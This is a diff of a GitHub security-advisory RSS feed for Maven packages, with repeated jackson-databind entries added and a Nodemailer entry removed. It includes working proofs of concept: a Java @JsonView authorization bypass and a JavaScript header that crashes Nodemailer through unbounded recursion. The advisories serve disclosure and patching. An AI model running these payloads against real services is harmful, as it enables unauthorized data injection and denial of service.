@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://azu.github.io/github-advisory-database-rss/maven.rss</id>
     <title>Security Advisory for Java artifacts hosted at the Maven central repository</title>
-    <updated>2026-07-21T18:07:53.486Z</updated>
+    <updated>2026-07-21T20:12:02.349Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Amaven"/>
     <subtitle>Security Advisory for Java artifacts hosted at the Maven central repository on GitHub</subtitle>
@@ -11,6 +11,373 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[com.fasterxml.jackson.core:jackson-databind] jackson-databind: `@JsonView` bypass for creator properties with `@JsonTypeInfo(include=As.EXTERNAL_PROPERTY)`]]></title>
+        <id>https://github.com/advisories/GHSA-mhm7-754m-9p8w</id>
+        <link href="https://github.com/advisories/GHSA-mhm7-754m-9p8w"/>
+        <updated>2026-07-21T19:40:13.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
+<p>In <code>BeanDeserializer.deserializeUsingPropertyBasedWithExternalTypeId</code>, the active-view (<code>@JsonView</code>) filter was applied only to the regular bean-property branch; the creator-property branch performed no <code>creatorProp.visibleInView(activeView)</code> check. A constructor parameter annotated with both <code>@JsonView(RestrictedView.class)</code> and <code>@JsonTypeInfo(use=Id.NAME,   include=As.EXTERNAL_PROPERTY)</code> is populated from attacker JSON even when a more restrictive view is active.</p>
+<p>  This is a patch gap. GHSA-5hh8 (CVE-2026-54517) and GHSA-rcqc (CVE-2026-54518) descriptions cover only the main property-based path and the unwrapped-creator path respectively; the external-type-id creator path was fixed on the 3.x line via #6004 ("Extend #5969/#5971 fixes to ... external-type-id case in regular BeanDeserializer", commit 7dc7a17, 2026-05-22) but
+  <strong>the fix was never backported to 2.21 or 2.18</strong>. Users on 2.21.4 and 2.18.8 who upgraded per the published advisories remain vulnerable to the same <code>@JsonView</code> bypass technique via a different code path.</p>
+<h2 id="vulnerable-code-path">Vulnerable Code Path</h2>
+<p>File: <code>com/fasterxml/jackson/databind/deser/BeanDeserializer.java</code>
+Method: <code>deserializeUsingPropertyBasedWithExternalTypeId</code></p>
+<p>On 2.21.4 (and 2.18.8), the creator-property branch (around line 1125-1158) checks <code>creatorProp.isInjectionOnly()</code> and hands off to <code>ext.handlePropertyValue(...)</code> / <code>buffer.assignParameter(...)</code> without ever consulting <code>visibleInView(activeView)</code>:</p>
+<pre><code class="language-java"> if (creatorProp != null) {
+     // [databind#1381]: if useInput=FALSE, skip deserialization from input
+     if (creatorProp.isInjectionOnly()) { ... }
+     // NO visibleInView(activeView) CHECK HERE
+     if (!ext.handlePropertyValue(p, ctxt, propName, null)) {
+         if (buffer.assignParameter(creatorProp, ...)) { ... }
+     }
+     continue;
+ }
+</code></pre>
+<p>On 3.1.4, the same branch contains the additional guard (commit 7dc7a17):</p>
+<pre><code class="language-java">  if (creatorProp != null) {
+     // [databind#5971]: must honor active view here too
+     if ((activeView != null) &amp;&amp; !creatorProp.visibleInView(activeView)) {
+         p.skipChildren();
+         continue;
+     }
+     ...
+ }
+</code></pre>
+<p>The 2.21 and 2.18 backport PRs (#6005 and #6003) only backported the main-path fixes from #5969/#5971; the external-type-id fix from #6004 was not backported. The maintainer closed #6005
+  with "got changes merged forward, looks like it's all covered now", but the forward-merge did not include the ExtTypeId creator branch.</p>
+<p>  Proof of Concept</p>
+<p>  Compiles and runs against jackson-databind 2.21.4:</p>
+<pre><code class="language-java">  import com.fasterxml.jackson.annotation.*;
+  import com.fasterxml.jackson.databind.ObjectMapper;
+
+  public class JsonViewExternalTypeIdBypass {
+      public static class PublicView {}
+      public static class AdminView extends PublicView {}
+
+      public static abstract class Asset { public String name; }
+      public static class PublicAsset extends Asset {}
+      public static class AdminAsset extends Asset { public String secret; }
+
+      public static class Container {
+          @JsonTypeInfo(use = JsonTypeInfo.Id.NAME,
+                  include = JsonTypeInfo.As.EXTERNAL_PROPERTY,
+                  property = "kind")
+          @JsonSubTypes({
+              @JsonSubTypes.Type(value = PublicAsset.class, name = "pub"),
+              @JsonSubTypes.Type(value = AdminAsset.class,  name = "admin")
+          })
+          @JsonView(AdminView.class)
+          public Asset asset;
+
+          public String label;
+
+          @JsonCreator
+          public Container(
+                  @JsonProperty("label") String label,
+                  @JsonProperty("asset") @JsonView(AdminView.class) Asset asset) {
+              this.label = label;
+              this.asset = asset;
+          }
+      }
+
+      public static class Wrapper {
+          @JsonView(PublicView.class)
+          public Container data;
+      }
+
+      public static void main(String[] args) throws Exception {
+          // Admin-only "asset" should be blocked when reading with PublicView
+          String json = "{\"data\":{\"label\":\"hello\",\"kind\":\"admin\","
+                      + "\"asset\":{\"name\":\"foo\",\"secret\":\"LEAKED\"}}}";
+
+          ObjectMapper om = new ObjectMapper();
+          Wrapper r = om.readerWithView(PublicView.class)
+                  .forType(Wrapper.class)
+                  .readValue(json);
+
+          System.out.println(r.data);
+          // Actual on 2.21.4:   Container{label='hello', asset=AdminAsset{name='foo', secret='LEAKED'}}
+          // Expected (secure):  Container{label='hello', asset=null}
+          if (r.data.asset != null &amp;&amp; r.data.asset instanceof AdminAsset) {
+              System.out.println("[!!] BYPASS CONFIRMED — admin-only asset populated under PublicView");
+          }
+      }
+  }
+</code></pre>
+<p>A control case that removes include = As.EXTERNAL_PROPERTY (forcing the normal property-based path) correctly returns asset = null, confirming the bypass is specific to the ExternalTypeId
+  code path and not a misconfiguration.</p>
+<h3 id="impact">Impact</h3>
+<p>  View-restricted (e.g. admin-only) creator properties can be populated from untrusted input where @JsonView is used as a write-side authorization boundary. Typical victims are Spring Boot
+  REST controllers that use @JsonView(PublicView.class) on the request body to whitelist user-settable fields — an attacker can inject the restricted creator parameter (including choosing
+  the polymorphic subtype via the sibling kind/type-id property) by combining it with a polymorphic @JsonTypeInfo(EXTERNAL_PROPERTY) annotation on the same field.</p>
+<ul>
+<li>CWE-863 (Incorrect Authorization)</li>
+<li>Same impact class as CVE-2026-54517 / CVE-2026-54518</li>
+<li>No RCE, no DoS — this is an access-control / mass-assignment bypass</li>
+</ul>
+<h3 id="trigger-conditions">Trigger Conditions</h3>
+<p>Developer code must combine (no opt-in user configuration required):</p>
+<ol>
+<li>Property-based @JsonCreator on the outer type</li>
+<li>A creator parameter annotated with @JsonView(RestrictedView.class)</li>
+<li>The same parameter annotated with @JsonTypeInfo(use=Id.NAME, include=As.EXTERNAL_PROPERTY, property="...")</li>
+</ol>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/FasterXML/jackson-databind/security/advisories/GHSA-mhm7-754m-9p8w">https://github.com/FasterXML/jackson-databind/security/advisories/GHSA-mhm7-754m-9p8w</a></li>
+<li><a href="https://github.com/FasterXML/jackson-databind/commit/c628b357ed143d8492756d5c1458cfb9fbeb29ed">https://github.com/FasterXML/jackson-databind/commit/c628b357ed143d8492756d5c1458cfb9fbeb29ed</a></li>
+<li><a href="https://github.com/FasterXML/jackson-databind/commit/dea7eb466e98cc226c4ac65587581fb49926820c">https://github.com/FasterXML/jackson-databind/commit/dea7eb466e98cc226c4ac65587581fb49926820c</a></li>
+<li><a href="https://github.com/advisories/GHSA-mhm7-754m-9p8w">https://github.com/advisories/GHSA-mhm7-754m-9p8w</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-mhm7-754m-9p8w</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-07-21T19:40:12.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[com.fasterxml.jackson.core:jackson-databind] jackson-databind: `@JsonView` bypass for creator properties with `@JsonTypeInfo(include=As.EXTERNAL_PROPERTY)`]]></title>
+        <id>https://github.com/advisories/GHSA-mhm7-754m-9p8w</id>
+        <link href="https://github.com/advisories/GHSA-mhm7-754m-9p8w"/>
+        <updated>2026-07-21T19:40:13.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
+<p>In <code>BeanDeserializer.deserializeUsingPropertyBasedWithExternalTypeId</code>, the active-view (<code>@JsonView</code>) filter was applied only to the regular bean-property branch; the creator-property branch performed no <code>creatorProp.visibleInView(activeView)</code> check. A constructor parameter annotated with both <code>@JsonView(RestrictedView.class)</code> and <code>@JsonTypeInfo(use=Id.NAME,   include=As.EXTERNAL_PROPERTY)</code> is populated from attacker JSON even when a more restrictive view is active.</p>
+<p>  This is a patch gap. GHSA-5hh8 (CVE-2026-54517) and GHSA-rcqc (CVE-2026-54518) descriptions cover only the main property-based path and the unwrapped-creator path respectively; the external-type-id creator path was fixed on the 3.x line via #6004 ("Extend #5969/#5971 fixes to ... external-type-id case in regular BeanDeserializer", commit 7dc7a17, 2026-05-22) but
+  <strong>the fix was never backported to 2.21 or 2.18</strong>. Users on 2.21.4 and 2.18.8 who upgraded per the published advisories remain vulnerable to the same <code>@JsonView</code> bypass technique via a different code path.</p>
+<h2 id="vulnerable-code-path">Vulnerable Code Path</h2>
+<p>File: <code>com/fasterxml/jackson/databind/deser/BeanDeserializer.java</code>
+Method: <code>deserializeUsingPropertyBasedWithExternalTypeId</code></p>
+<p>On 2.21.4 (and 2.18.8), the creator-property branch (around line 1125-1158) checks <code>creatorProp.isInjectionOnly()</code> and hands off to <code>ext.handlePropertyValue(...)</code> / <code>buffer.assignParameter(...)</code> without ever consulting <code>visibleInView(activeView)</code>:</p>
+<pre><code class="language-java"> if (creatorProp != null) {
+     // [databind#1381]: if useInput=FALSE, skip deserialization from input
+     if (creatorProp.isInjectionOnly()) { ... }
+     // NO visibleInView(activeView) CHECK HERE
+     if (!ext.handlePropertyValue(p, ctxt, propName, null)) {
+         if (buffer.assignParameter(creatorProp, ...)) { ... }
+     }
+     continue;
+ }
+</code></pre>
+<p>On 3.1.4, the same branch contains the additional guard (commit 7dc7a17):</p>
+<pre><code class="language-java">  if (creatorProp != null) {
+     // [databind#5971]: must honor active view here too
+     if ((activeView != null) &amp;&amp; !creatorProp.visibleInView(activeView)) {
+         p.skipChildren();
+         continue;
+     }
+     ...
+ }
+</code></pre>
+<p>The 2.21 and 2.18 backport PRs (#6005 and #6003) only backported the main-path fixes from #5969/#5971; the external-type-id fix from #6004 was not backported. The maintainer closed #6005
+  with "got changes merged forward, looks like it's all covered now", but the forward-merge did not include the ExtTypeId creator branch.</p>
+<p>  Proof of Concept</p>
+<p>  Compiles and runs against jackson-databind 2.21.4:</p>
+<pre><code class="language-java">  import com.fasterxml.jackson.annotation.*;
+  import com.fasterxml.jackson.databind.ObjectMapper;
+
+  public class JsonViewExternalTypeIdBypass {
+      public static class PublicView {}
+      public static class AdminView extends PublicView {}
+
+      public static abstract class Asset { public String name; }
+      public static class PublicAsset extends Asset {}
+      public static class AdminAsset extends Asset { public String secret; }
+
+      public static class Container {
+          @JsonTypeInfo(use = JsonTypeInfo.Id.NAME,
+                  include = JsonTypeInfo.As.EXTERNAL_PROPERTY,
+                  property = "kind")
+          @JsonSubTypes({
+              @JsonSubTypes.Type(value = PublicAsset.class, name = "pub"),
+              @JsonSubTypes.Type(value = AdminAsset.class,  name = "admin")
+          })
+          @JsonView(AdminView.class)
+          public Asset asset;
+
+          public String label;
+
+          @JsonCreator
+          public Container(
+                  @JsonProperty("label") String label,
+                  @JsonProperty("asset") @JsonView(AdminView.class) Asset asset) {
+              this.label = label;
+              this.asset = asset;
+          }
+      }
+
+      public static class Wrapper {
+          @JsonView(PublicView.class)
+          public Container data;
+      }
+
+      public static void main(String[] args) throws Exception {
+          // Admin-only "asset" should be blocked when reading with PublicView
+          String json = "{\"data\":{\"label\":\"hello\",\"kind\":\"admin\","
+                      + "\"asset\":{\"name\":\"foo\",\"secret\":\"LEAKED\"}}}";
+
+          ObjectMapper om = new ObjectMapper();
+          Wrapper r = om.readerWithView(PublicView.class)
+                  .forType(Wrapper.class)
+                  .readValue(json);
+
+          System.out.println(r.data);
+          // Actual on 2.21.4:   Container{label='hello', asset=AdminAsset{name='foo', secret='LEAKED'}}
+          // Expected (secure):  Container{label='hello', asset=null}
+          if (r.data.asset != null &amp;&amp; r.data.asset instanceof AdminAsset) {
+              System.out.println("[!!] BYPASS CONFIRMED — admin-only asset populated under PublicView");
+          }
+      }
+  }
+</code></pre>
+<p>A control case that removes include = As.EXTERNAL_PROPERTY (forcing the normal property-based path) correctly returns asset = null, confirming the bypass is specific to the ExternalTypeId
+  code path and not a misconfiguration.</p>
+<h3 id="impact">Impact</h3>
+<p>  View-restricted (e.g. admin-only) creator properties can be populated from untrusted input where @JsonView is used as a write-side authorization boundary. Typical victims are Spring Boot
+  REST controllers that use @JsonView(PublicView.class) on the request body to whitelist user-settable fields — an attacker can inject the restricted creator parameter (including choosing
+  the polymorphic subtype via the sibling kind/type-id property) by combining it with a polymorphic @JsonTypeInfo(EXTERNAL_PROPERTY) annotation on the same field.</p>
+<ul>
+<li>CWE-863 (Incorrect Authorization)</li>
+<li>Same impact class as CVE-2026-54517 / CVE-2026-54518</li>
+<li>No RCE, no DoS — this is an access-control / mass-assignment bypass</li>
+</ul>
+<h3 id="trigger-conditions">Trigger Conditions</h3>
+<p>Developer code must combine (no opt-in user configuration required):</p>
+<ol>
+<li>Property-based @JsonCreator on the outer type</li>
+<li>A creator parameter annotated with @JsonView(RestrictedView.class)</li>
+<li>The same parameter annotated with @JsonTypeInfo(use=Id.NAME, include=As.EXTERNAL_PROPERTY, property="...")</li>
+</ol>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/FasterXML/jackson-databind/security/advisories/GHSA-mhm7-754m-9p8w">https://github.com/FasterXML/jackson-databind/security/advisories/GHSA-mhm7-754m-9p8w</a></li>
+<li><a href="https://github.com/FasterXML/jackson-databind/commit/c628b357ed143d8492756d5c1458cfb9fbeb29ed">https://github.com/FasterXML/jackson-databind/commit/c628b357ed143d8492756d5c1458cfb9fbeb29ed</a></li>
+<li><a href="https://github.com/FasterXML/jackson-databind/commit/dea7eb466e98cc226c4ac65587581fb49926820c">https://github.com/FasterXML/jackson-databind/commit/dea7eb466e98cc226c4ac65587581fb49926820c</a></li>
+<li><a href="https://github.com/advisories/GHSA-mhm7-754m-9p8w">https://github.com/advisories/GHSA-mhm7-754m-9p8w</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-mhm7-754m-9p8w</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-07-21T19:40:12.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[tools.jackson.core:jackson-databind] jackson-databind: @JsonIgnore on a Record property is bypassed with a PropertyNamingStrategy]]></title>
+        <id>https://github.com/advisories/GHSA-3pjw-73gf-8qr5</id>
+        <link href="https://github.com/advisories/GHSA-3pjw-73gf-8qr5"/>
+        <updated>2026-07-21T19:33:07.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
+<p>For Java Records, <code>POJOPropertiesCollector._removeUnwantedIgnorals()</code> records a <code>@JsonIgnore</code>-annotated component under its original implicit name before <code>_renameUsing()</code> applies the <code>PropertyNamingStrategy</code>. After the rename, <code>_ignoredPropertyNames</code> still holds only the pre-rename name, so <code>_ignorableProps</code> is built from the stale key. The renamed JSON key passes <code>IgnorePropertiesUtil.shouldIgnore()</code> and is assigned to the Record's constructor parameter, defeating the <code>@JsonIgnore</code>.</p>
+<h2 id="impact">Impact</h2>
+<p>A Record using a naming strategy that relies on <code>@JsonIgnore</code> to keep an internal/privileged component out of deserialization can have that component set from the wire via its renamed key (e.g. a role/flag controlled by an untrusted client).</p>
+<h2 id="affected--patched-verified-via-git-tag---contains">Affected / Patched (verified via <code>git tag --contains</code>)</h2>
+<ul>
+<li>2.15-2.18 line: <code>&gt;= 2.15.0, &lt; 2.18.8</code> -&gt; fixed in <strong>2.18.8</strong> (backport <code>c7c6783</code>)</li>
+<li>2.19-2.21 line: <code>&gt;= 2.19.0, &lt; 2.21.4</code> -&gt; fixed in <strong>2.21.4</strong></li>
+<li>3.x line: <code>&gt;= 3.0.0, &lt; 3.1.4</code> -&gt; fixed in <strong>3.1.4</strong> (#5974, <code>baa2cdf</code>)</li>
+</ul>
+<h2 id="severity--cwe">Severity / CWE</h2>
+<p>Maintainer: minor. Reporter: Moderate. CWE-915; related CWE-345.</p>
+<h2 id="credits">Credits</h2>
+<p>Omkhar Arasaratnam (@omkhar) - finder.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/FasterXML/jackson-databind/security/advisories/GHSA-3pjw-73gf-8qr5">https://github.com/FasterXML/jackson-databind/security/advisories/GHSA-3pjw-73gf-8qr5</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-59888">https://nvd.nist.gov/vuln/detail/CVE-2026-59888</a></li>
+<li><a href="https://github.com/FasterXML/jackson-databind/pull/5974">https://github.com/FasterXML/jackson-databind/pull/5974</a></li>
+<li><a href="https://github.com/FasterXML/jackson-databind/commit/baa2cdf5ca2b2717fbb88d91955d69d8651df3e4">https://github.com/FasterXML/jackson-databind/commit/baa2cdf5ca2b2717fbb88d91955d69d8651df3e4</a></li>
+<li><a href="https://github.com/FasterXML/jackson-databind/commit/c7c678360624da5bc7eed2152789fa522880db9d">https://github.com/FasterXML/jackson-databind/commit/c7c678360624da5bc7eed2152789fa522880db9d</a></li>
+<li><a href="https://github.com/advisories/GHSA-3pjw-73gf-8qr5">https://github.com/advisories/GHSA-3pjw-73gf-8qr5</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-3pjw-73gf-8qr5</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-07-21T19:33:06.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[com.fasterxml.jackson.core:jackson-databind] jackson-databind: @JsonIgnore on a Record property is bypassed with a PropertyNamingStrategy]]></title>
+        <id>https://github.com/advisories/GHSA-3pjw-73gf-8qr5</id>
+        <link href="https://github.com/advisories/GHSA-3pjw-73gf-8qr5"/>
+        <updated>2026-07-21T19:33:07.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
+<p>For Java Records, <code>POJOPropertiesCollector._removeUnwantedIgnorals()</code> records a <code>@JsonIgnore</code>-annotated component under its original implicit name before <code>_renameUsing()</code> applies the <code>PropertyNamingStrategy</code>. After the rename, <code>_ignoredPropertyNames</code> still holds only the pre-rename name, so <code>_ignorableProps</code> is built from the stale key. The renamed JSON key passes <code>IgnorePropertiesUtil.shouldIgnore()</code> and is assigned to the Record's constructor parameter, defeating the <code>@JsonIgnore</code>.</p>
+<h2 id="impact">Impact</h2>
+<p>A Record using a naming strategy that relies on <code>@JsonIgnore</code> to keep an internal/privileged component out of deserialization can have that component set from the wire via its renamed key (e.g. a role/flag controlled by an untrusted client).</p>
+<h2 id="affected--patched-verified-via-git-tag---contains">Affected / Patched (verified via <code>git tag --contains</code>)</h2>
+<ul>
+<li>2.15-2.18 line: <code>&gt;= 2.15.0, &lt; 2.18.8</code> -&gt; fixed in <strong>2.18.8</strong> (backport <code>c7c6783</code>)</li>
+<li>2.19-2.21 line: <code>&gt;= 2.19.0, &lt; 2.21.4</code> -&gt; fixed in <strong>2.21.4</strong></li>
+<li>3.x line: <code>&gt;= 3.0.0, &lt; 3.1.4</code> -&gt; fixed in <strong>3.1.4</strong> (#5974, <code>baa2cdf</code>)</li>
+</ul>
+<h2 id="severity--cwe">Severity / CWE</h2>
+<p>Maintainer: minor. Reporter: Moderate. CWE-915; related CWE-345.</p>
+<h2 id="credits">Credits</h2>
+<p>Omkhar Arasaratnam (@omkhar) - finder.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/FasterXML/jackson-databind/security/advisories/GHSA-3pjw-73gf-8qr5">https://github.com/FasterXML/jackson-databind/security/advisories/GHSA-3pjw-73gf-8qr5</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-59888">https://nvd.nist.gov/vuln/detail/CVE-2026-59888</a></li>
+<li><a href="https://github.com/FasterXML/jackson-databind/pull/5974">https://github.com/FasterXML/jackson-databind/pull/5974</a></li>
+<li><a href="https://github.com/FasterXML/jackson-databind/commit/baa2cdf5ca2b2717fbb88d91955d69d8651df3e4">https://github.com/FasterXML/jackson-databind/commit/baa2cdf5ca2b2717fbb88d91955d69d8651df3e4</a></li>
+<li><a href="https://github.com/FasterXML/jackson-databind/commit/c7c678360624da5bc7eed2152789fa522880db9d">https://github.com/FasterXML/jackson-databind/commit/c7c678360624da5bc7eed2152789fa522880db9d</a></li>
+<li><a href="https://github.com/advisories/GHSA-3pjw-73gf-8qr5">https://github.com/advisories/GHSA-3pjw-73gf-8qr5</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-3pjw-73gf-8qr5</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-07-21T19:33:06.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[com.fasterxml.jackson.core:jackson-databind] jackson-databind: @JsonIgnore on a Record property is bypassed with a PropertyNamingStrategy]]></title>
+        <id>https://github.com/advisories/GHSA-3pjw-73gf-8qr5</id>
+        <link href="https://github.com/advisories/GHSA-3pjw-73gf-8qr5"/>
+        <updated>2026-07-21T19:33:07.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
+<p>For Java Records, <code>POJOPropertiesCollector._removeUnwantedIgnorals()</code> records a <code>@JsonIgnore</code>-annotated component under its original implicit name before <code>_renameUsing()</code> applies the <code>PropertyNamingStrategy</code>. After the rename, <code>_ignoredPropertyNames</code> still holds only the pre-rename name, so <code>_ignorableProps</code> is built from the stale key. The renamed JSON key passes <code>IgnorePropertiesUtil.shouldIgnore()</code> and is assigned to the Record's constructor parameter, defeating the <code>@JsonIgnore</code>.</p>
+<h2 id="impact">Impact</h2>
+<p>A Record using a naming strategy that relies on <code>@JsonIgnore</code> to keep an internal/privileged component out of deserialization can have that component set from the wire via its renamed key (e.g. a role/flag controlled by an untrusted client).</p>
+<h2 id="affected--patched-verified-via-git-tag---contains">Affected / Patched (verified via <code>git tag --contains</code>)</h2>
+<ul>
+<li>2.15-2.18 line: <code>&gt;= 2.15.0, &lt; 2.18.8</code> -&gt; fixed in <strong>2.18.8</strong> (backport <code>c7c6783</code>)</li>
+<li>2.19-2.21 line: <code>&gt;= 2.19.0, &lt; 2.21.4</code> -&gt; fixed in <strong>2.21.4</strong></li>
+<li>3.x line: <code>&gt;= 3.0.0, &lt; 3.1.4</code> -&gt; fixed in <strong>3.1.4</strong> (#5974, <code>baa2cdf</code>)</li>
+</ul>
+<h2 id="severity--cwe">Severity / CWE</h2>
+<p>Maintainer: minor. Reporter: Moderate. CWE-915; related CWE-345.</p>
+<h2 id="credits">Credits</h2>
+<p>Omkhar Arasaratnam (@omkhar) - finder.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/FasterXML/jackson-databind/security/advisories/GHSA-3pjw-73gf-8qr5">https://github.com/FasterXML/jackson-databind/security/advisories/GHSA-3pjw-73gf-8qr5</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-59888">https://nvd.nist.gov/vuln/detail/CVE-2026-59888</a></li>
+<li><a href="https://github.com/FasterXML/jackson-databind/pull/5974">https://github.com/FasterXML/jackson-databind/pull/5974</a></li>
+<li><a href="https://github.com/FasterXML/jackson-databind/commit/baa2cdf5ca2b2717fbb88d91955d69d8651df3e4">https://github.com/FasterXML/jackson-databind/commit/baa2cdf5ca2b2717fbb88d91955d69d8651df3e4</a></li>
+<li><a href="https://github.com/FasterXML/jackson-databind/commit/c7c678360624da5bc7eed2152789fa522880db9d">https://github.com/FasterXML/jackson-databind/commit/c7c678360624da5bc7eed2152789fa522880db9d</a></li>
+<li><a href="https://github.com/advisories/GHSA-3pjw-73gf-8qr5">https://github.com/advisories/GHSA-3pjw-73gf-8qr5</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-3pjw-73gf-8qr5</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-07-21T19:33:06.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[org.postgresql:postgresql] PostgreSQL JDBC Driver: Silent channel-binding authentication downgrade via unsupported certificate algorithms]]></title>
         <id>https://github.com/advisories/GHSA-j92g-9f8w-j867</id>
@@ -499,223 +866,5 @@ If there are any questions or comments about this advisory, contact [AWS/Amazon]
         </author>
         <category label="severity" term="CRITICAL"/>
         <published>2026-06-04T18:30:32.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[org.webjars.npm:nodemailer] Nodemailer’s addressparser is vulnerable to DoS caused by recursive calls]]></title>
-        <id>https://github.com/advisories/GHSA-rcmh-qjqh-p98v</id>
-        <link href="https://github.com/advisories/GHSA-rcmh-qjqh-p98v"/>
-        <updated>2026-07-15T21:55:34.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p>A DoS can occur that immediately halts the system due to the use of an unsafe function.</p>
-<h3 id="details">Details</h3>
-<p>According to <strong>RFC 5322</strong>, nested group structures (a group inside another group) are not allowed. Therefore, in lib/addressparser/index.js, the email address parser performs flattening when nested groups appear, since such input is likely to be abnormal. (If the address is valid, it is added as-is.) In other words, the parser flattens all nested groups and inserts them into the final group list.
-However, the code implemented for this flattening process can be exploited by malicious input and triggers DoS</p>
-<p>RFC 5322 uses a colon (:) to define a group, and commas (,) are used to separate members within a group.
-At the following location in lib/addressparser/index.js:</p>
-<p><a href="https://github.com/nodemailer/nodemailer/blob/master/lib/addressparser/index.js#L90">https://github.com/nodemailer/nodemailer/blob/master/lib/addressparser/index.js#L90</a></p>
-<p>there is code that performs this flattening. The issue occurs when the email address parser attempts to process the following kind of malicious address header:</p>
-<p><code>g0: g1: g2: g3: ... gN: victim@example.com;</code></p>
-<p>Because no recursion depth limit is enforced, the parser repeatedly invokes itself in the pattern
-<code>addressparser → _handleAddress → addressparser → ...</code>
-for each nested group. As a result, when an attacker sends a header containing many colons, Nodemailer enters infinite recursion, eventually throwing Maximum call stack size exceeded and causing the process to terminate immediately. Due to the structure of this behavior, no authentication is required, and a single request is enough to shut down the service.</p>
-<p>The problematic code section is as follows:</p>
-<pre><code class="language-js">if (isGroup) {
-    ...
-    if (data.group.length) {
-        let parsedGroup = addressparser(data.group.join(',')); // &lt;- boom!
-        parsedGroup.forEach(member =&gt; {
-            if (member.group) {
-                groupMembers = groupMembers.concat(member.group);
-            } else {
-                groupMembers.push(member);
-            }
-        });
-    }
-}
-</code></pre>
-<p><code>data.group</code> is expected to contain members separated by commas, but in the attacker’s payload the group contains colon <code>(:)</code> tokens. Because of this, the parser repeatedly triggers recursive calls for each colon, proportional to their number.</p>
-<h3 id="poc">PoC</h3>
-<pre><code>const nodemailer = require('nodemailer');
-
-function buildDeepGroup(depth) {
-  let parts = [];
-  for (let i = 0; i &lt; depth; i++) {
-    parts.push(`g${i}:`);
-  }
-  return parts.join(' ') + ' user@example.com;';
-}
-
-const DEPTH = 3000; // &lt;- control depth 
-const toHeader = buildDeepGroup(DEPTH);
-console.log('to header length:', toHeader.length);
-
-const transporter = nodemailer.createTransport({
-  streamTransport: true,
-  buffer: true,
-  newline: 'unix'
-});
-
-console.log('parsing start');
-
-transporter.sendMail(
-  {
-    from: 'test@example.com',
-    to: toHeader,
-    subject: 'test',
-    text: 'test'
-  },
-  (err, info) =&gt; {
-    if (err) {
-      console.error('error:', err);
-    } else {
-      console.log('finished :', info &amp;&amp; info.envelope);
-    }
-  }
-);
-</code></pre>
-<p>As a result, when the colon is repeated beyond a certain threshold, the Node.js process terminates immediately.</p>
-<h3 id="impact">Impact</h3>
-<p>The attacker can achieve the following:</p>
-<ol>
-<li>Force an immediate crash of any server/service that uses Nodemailer</li>
-<li>Kill the backend process with a single web request</li>
-<li>In environments using PM2/Forever, trigger a continuous restart loop, causing severe resource exhaustion”</li>
-</ol>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/nodemailer/nodemailer/security/advisories/GHSA-rcmh-qjqh-p98v">https://github.com/nodemailer/nodemailer/security/advisories/GHSA-rcmh-qjqh-p98v</a></li>
-<li><a href="https://github.com/nodemailer/nodemailer/commit/b61b9c0cfd682b6f647754ca338373b68336a150">https://github.com/nodemailer/nodemailer/commit/b61b9c0cfd682b6f647754ca338373b68336a150</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-14874">https://nvd.nist.gov/vuln/detail/CVE-2025-14874</a></li>
-<li><a href="https://access.redhat.com/security/cve/CVE-2025-14874">https://access.redhat.com/security/cve/CVE-2025-14874</a></li>
-<li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=2418133">https://bugzilla.redhat.com/show_bug.cgi?id=2418133</a></li>
-<li><a href="https://github.com/nodemailer/nodemailer/commit/6218b8df">https://github.com/nodemailer/nodemailer/commit/6218b8df</a></li>
-<li><a href="https://github.com/advisories/GHSA-rcmh-qjqh-p98v">https://github.com/advisories/GHSA-rcmh-qjqh-p98v</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-rcmh-qjqh-p98v</uri>
